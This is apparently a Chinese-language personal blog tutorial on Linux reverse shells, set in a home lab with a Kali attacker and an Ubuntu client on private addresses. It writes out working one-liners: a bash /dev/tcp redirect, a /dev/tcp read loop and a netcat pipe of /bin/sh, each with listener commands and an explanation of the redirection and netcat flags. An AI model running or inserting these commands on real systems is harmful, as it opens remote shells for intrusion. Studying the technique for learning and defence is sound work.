---
title: linux反弹shell
date: 2021-10-16 19:51:39
cover: https://w.wallhaven.cc/full/z8/wallhaven-z8dg9y.png
---



# linux反弹shell

客户机：ubuntu

ip: 192.168.118.130

攻击机：kali  

ip:192.168.118.128

## 1.bash反弹

攻击机执行命令：

```
nc -lvp 8888
```

![](https://i.loli.net/2021/10/09/STNBcU6bdr9XwW5.png)

客户机执行命令：

```
bash -i >& /dev/tcp/192.168.118.128/8888 0>&1
```

![](https://i.loli.net/2021/10/09/Sd84UwZfyoCgt7L.png)

然后攻击机这边成功拿到shell

![](https://i.loli.net/2021/10/09/EegIW67x9sPRu8A.png)

### 原理

``` 
bash -i >& /dev/tcp/远程ip/port 0>&1
```

bash是/bin/目录下的二进制程序

/dev/tcp是Linux中的一个特殊设备，打开这个文件相当于发出了一个socket调用，建立一个socket连接。

0>&:  当>&后面接文件时，表示将标准输出和标准错误输出重定向至文件。

0>&1: 在命令后面加上0>&1,表示将标准输入重定向到标准输出，这里的标准输出已经重定向到了/dev/tcp/远程ip/port这个文件，也就是远程，那么标准输入也重定向到了远程

```
nc -lvp port
```

nc 全称为netcat，所做的就是在两台电脑之间建立链接，并返回两个数据流。

-g<网关> 设置路由器跃程通信网关，最多可设置8个。
-G<指向器数目> 设置来源路由指向器，其数值为4的倍数。
-h 在线帮助。
-i<延迟秒数> 设置时间间隔，以便传送信息及扫描通信端口。
-l 使用监听模式，管控传入的资料。
-n 直接使用IP地址，而不通过域名服务器。
-o<输出文件> 指定文件名称，把往来传输的数据以16进制字码倾倒成该文件保存。
-p<通信端口> 设置本地主机使用的通信端口。
-r 乱数指定本地与远端主机的通信端口。
-s<来源位址> 设置本地主机送出数据包的IP地址。
-u 使用UDP传输协议。
-v 显示指令执行过程。详细信息
-w<超时秒数> 设置等待连线的时间。
-z 使用0输入/输出模式，只在扫描通信端口时使用。



其他版本

攻击机：

```
nc -lvp 3434
```

```
客户机：
exec 5<>/dev/tcp/192.168.118.128/3434
cat <&5 | while read line; do $line 2>&5 >&5; done
```

![](https://raw.githubusercontent.com/todis21/todis21.github.io/master/img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202021-10-13%20222957.png)

![](https://raw.githubusercontent.com/todis21/todis21.github.io/master/img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202021-10-13%20223016.png)

##  2.nc交互式反弹

攻击机

``` 
nc -lvp 8888
nc -lvvp 8888
```

![](https://i.loli.net/2021/10/09/nM47yYBSRo2UmNX.png)

客户机;

``` 
 /bin/sh | nc 192.168.118.128 8888
```

连接后，在攻击机输入的字符回车后会在客户机呈现

![](https://i.loli.net/2021/10/09/BzpsmjTncC6oQre.png)

![](https://i.loli.net/2021/10/09/xIK14h8bEkUDs9i.png)







[参考文章1](https://xz.aliyun.com/t/2548)

[参考文章2](https://xz.aliyun.com/t/2549)
